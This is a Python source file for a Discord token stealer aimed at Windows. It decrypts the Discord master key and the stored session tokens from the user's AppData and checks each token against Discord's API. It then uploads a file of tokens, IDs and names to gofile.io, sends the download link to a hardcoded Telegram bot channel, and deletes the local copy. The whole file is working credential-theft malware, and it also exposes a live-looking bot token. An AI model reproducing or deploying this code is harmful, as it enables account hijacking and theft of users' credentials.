import base64
from Crypto.Cipher import AES
import win32crypt
import os
import json
import requests
import subprocess

BOT_TOKEN = '7147454534:AAHa08rDeHun1_JWqqOMu9wPAas1I9_Wpbc'
CHANNEL_ID = -1002015035900


def send_download_link(download_link):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/SendMessage?chat_id={CHANNEL_ID}&text=Target: {get_sys_username()}\nDownload Link: {download_link}'

    requests.get(url)


def upload_file(file):
    res = subprocess.check_output('curl -s https://api.gofile.io/getServer', shell=True).decode()

    jsdata = json.loads(res)

    server = jsdata['data']

    server = server['server']

    res = subprocess.check_output(f'curl -s -F file=@{file} https://{server}.gofile.io/uploadFile', shell=True).decode()

    jsdata = json.loads(res)

    download_link = jsdata['data']['downloadPage']

    send_download_link(download_link)


def token_validator(token):
    r = requests.get(url='https://discord.com/api/v9/users/@me/settings', headers={'Authorization': f'{token}'})
    if r.status_code == 200:
        return r.status_code, json.loads(r.text)['custom_status']['text']
    else:
        return r.status_code, 'ERROR'


def get_sys_username():
    return os.getlogin()


def get_masterKey():
    """
     Master Key is a key we use it to make the cipher from it then decrypt the token.
    """
    username = get_sys_username()
    path = 'c:/Users/' + username + '/AppData/Roaming/discord/Local State'  # the location of master key
    with open(path, 'r') as f:
        data = f.read()
        data = json.loads(data)
        key = data['os_crypt'][
            'encrypted_key']  # this is the master key, but it's encrypted with win32crypt windows function
        return win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[
            1]  # we decrypted the master key, and it's ready to use


class Discord:
    encrypted_tokens = []
    decrypted_tokens = []

    def __init__(self):
        """
        Grab All Discord Tokens Found on This Machine.
        """

    def get_tokens(self):
        """
        Grab All Tokens Then Decrypt Them and Store them Into a List.
        """
        username = get_sys_username()
        path: str = "c:/Users/" + username + "/AppData/Roaming/discord/Local Storage/leveldb/"  # Here is where the tokens are stored.
        mkey = get_masterKey()
        for file in os.listdir(path):
            if file[-3:] in ['ldb', 'log']:
                with open(path + file, errors='ignore') as f:
                    data = f.readlines()
                    encrypted_tokens_list = [x.strip() for x in data if 'dQw4w9WgXcQ:' in x]
                    for token in encrypted_tokens_list:
                        for _ in token.split():
                            if 'dQw4w9WgXcQ:' in _:
                                enc_token_ = _.split('dQw4w9WgXcQ:')[1][:136]
                                self.encrypted_tokens.append(enc_token_)

        for enc_token in self.encrypted_tokens:
            decoded_token = base64.b64decode(enc_token)
            iv = decoded_token[3:15]
            password = decoded_token[15:]
            cipher = AES.new(mkey, AES.MODE_GCM, iv)
            decrypted_token = cipher.decrypt(password)
            try:
                self.decrypted_tokens.append(decrypted_token[:-15].decode('utf-8'))
            except UnicodeDecodeError:
                self.decrypted_tokens.append(decrypted_token[:-16].decode('utf-8'))
                continue

        return self.decrypted_tokens


if __name__ == '__main__':
    discord = Discord()
    decrypted_tokens = discord.get_tokens()
    for token in decrypted_tokens:

        try:
            token = token.replace('', '')
        except ValueError:
            pass

        try:
            token = token.replace('`', '')
        except ValueError:
            pass

        try:
            token = token.replace('', '')
        except ValueError:
            pass
        try:
            token = token.replace('|', '')
        except ValueError:
            pass
        try:
            token = token.replace('', '')
        except ValueError:
            pass
        try:
            token = token.replace('', '')
        except ValueError:
            pass


        token_resp = token_validator(token)
        uid = token.split('.')[0]
        dec_uid = base64.b64decode(uid).decode('utf-8')
        os.chdir(str('C:\\Users\\' + get_sys_username()))
        with open('discordToken.txt', 'a', encoding='utf-8') as f:
            f.writelines(
                ['=' * 65, f'\nCode: {token_resp[0]}\nToken: {token}\nDiscord ID: {dec_uid}\nName: {token_resp[1]}\n',
                 '=' * 65 + '\n\n'])
    upload_file('discordToken.txt')
    os.remove('discordToken.txt')
